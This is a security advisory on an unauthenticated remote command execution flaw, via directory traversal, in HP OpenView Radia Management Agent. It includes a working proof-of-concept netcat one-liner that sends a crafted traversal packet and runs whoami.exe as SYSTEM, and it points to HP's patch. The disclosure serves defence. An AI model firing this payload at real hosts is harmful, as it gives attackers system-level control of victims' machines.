NGSSoftware Insight Security Research Advisory

Name: HP OpenView Radia Management Agent remote command execution via
directory traversal
Systems Affected: HP OpenView Radia Management Portal versions 2.x and
1.x running Radia Management Agent
Severity: High
Vendor URL: http://www.hp.com/
Authors: David Morgan      davidm@...software.com
          Dominic Beecher   dominic@...software.com
Date of initial advisory:  28 April 2005
Date of full advisory:     28 July 2005

Description
-----------

The Radia Management Agent is part of HP's OpenView Radia suite of
software. It runs as a Windows service (RMA) with Local System
privileges. The RMA service listens on a TCP port that is not fixed. In
the example below, the service was listening on TCP port 1065.

By connecting to the TCP port and sending a crafted packet, it is
possible to traverse out of C:\Program Files\Novadigm (the apparent
working directory) and run any executable that is located on the same
logical disk partition, in this case the C: drive.

C:\>sc queryex rma

SERVICE_NAME: rma
         TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
         STATE              : 4  RUNNING
                                 (STOPPABLE, NOT_PAUSABLE,
IGNORES_SHUTDOWN))
         WIN32_EXIT_CODE    : 0  (0x0)
         SERVICE_EXIT_CODE  : 0  (0x0)
         CHECKPOINT         : 0x0
         WAIT_HINT          : 0x0
         PID                : 1032
         FLAGS              :

C:\>netstat -ano

   TCP    0.0.0.0:1065       0.0.0.0:0              LISTENING       1032

bash$ printf "\x00\x00\x00../../windows/system32/whoami.exe\x00" | nc -v
xx.xx.xx.xx 1065

host.domain [xx.xx.xx.xx] 1065 (?) open
nt authority\system

The output from whoami.exe clearly demonstrates that it is possible for
a remote attacker to execute arbitrary system commands with Local System
privileges without authentication.

Fix Information
---------------

HP has developed a patch to fix the problem. More information can be
found in their security bulletin HPSBMA01138:
